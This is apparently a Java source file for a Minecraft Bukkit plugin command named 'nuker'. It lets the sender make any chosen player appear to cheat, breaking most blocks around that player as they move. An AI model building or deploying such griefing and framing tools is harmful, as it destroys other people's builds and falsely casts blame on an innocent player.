package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerMoveEvent;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.UUID;

public class Nuker implements Command, Listener {
    private final HashMap<UUID, Integer> toggled = new HashMap<>();
    private Z_ z;

    public int minAConsoleArgs() {
        return 2;
    }

    @Override
    public String[] getCommands() {
        return new String[]{"nuker"};
    }

    @Override
    public String getDescription() {
        return "Makes a player look like they're using nuker.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();

        Player foundPlayer = executor;
        if (args.length != 0) {
            try {
                // Check if is int
                Integer.parseInt(args[0]);
            } catch (Exception ignored) {
                // If not an int
                foundPlayer = Bukkit.getPlayer(args[0]);
                if (foundPlayer == null) {
                    sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
                    return;
                }
            }
        }

        int radius = 5;
        if (foundPlayer.getName().equals(sender.getName())) {
            if (args.length != 0) {
                try {
                    radius = Integer.parseInt(args[0]);
                } catch (Exception e) {
                    sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                }
            }
        } else {
            if (args.length > 1) {
                try {
                    radius = Integer.parseInt(args[1]);
                } catch (Exception e) {
                    sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                }
            }
        }

        if (radius > 50) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "Woah, that radius is way too big! Please try a smaller number!");
            return;
        }

        try {
            String name = foundPlayer.getName().equals(sender.getName()) ? "You are" : foundPlayer.getName() + " is";

            UUID uuid = foundPlayer.getUniqueId();
            if (toggled.containsKey(uuid) && radius == 5) {
                toggled.remove(uuid);
                sender.sendMessage(Colors.Prefix + Colors.Failure + name + " no longer using nuker!");
                return;
            }

            toggled.put(uuid, radius);
            sender.sendMessage(Colors.Prefix + Colors.Success + name + " now using nuker with a radius of " + radius + "!");
        } catch (Exception e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
        }
    }

    @Override
    public void onEnable(Z_ z) {
        this.z = z;
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    @EventHandler
    private void playerMoveEvent(PlayerMoveEvent e) {
        Player p = e.getPlayer();

        if (!toggled.containsKey(p.getUniqueId())) {
            return;
        }

        int r = toggled.get(p.getUniqueId()) / 2;
        Location loc1 = e.getPlayer().getLocation().add(r, r, r);
        Location loc2 = e.getPlayer().getLocation().subtract(r, r, r);
        Bukkit.getScheduler().scheduleSyncDelayedTask(this.z, () -> nuke(p.getWorld(), loc1, loc2));
    }

    private void nuke(World w, Location loc1, Location loc2) {
        int topBlockX = Math.max(loc1.getBlockX(), loc2.getBlockX());
        int bottomBlockX = Math.min(loc1.getBlockX(), loc2.getBlockX());
        int topBlockY = Math.max(loc1.getBlockY(), loc2.getBlockY());
        int bottomBlockY = Math.min(loc1.getBlockY(), loc2.getBlockY());
        int topBlockZ = Math.max(loc1.getBlockZ(), loc2.getBlockZ());
        int bottomBlockZ = Math.min(loc1.getBlockZ(), loc2.getBlockZ());

        for (int x = bottomBlockX; x <= topBlockX; x++) {
            for (int z = bottomBlockZ; z <= topBlockZ; z++) {
                for (int y = bottomBlockY; y <= topBlockY; y++) {
                    Block block = w.getBlockAt(x, y, z);

                    try {
                        List<Material> materialArray = Arrays.asList(Material.AIR, null, Material.BEDROCK,
                                Material.BARRIER, Material.WATER, Material.LAVA);

                        if (!materialArray.contains(block.getType())) {
                            block.breakNaturally();
                        }
                    } catch (Exception exception) {
                        block.breakNaturally();
                    }
                }
            }
        }
    }
}
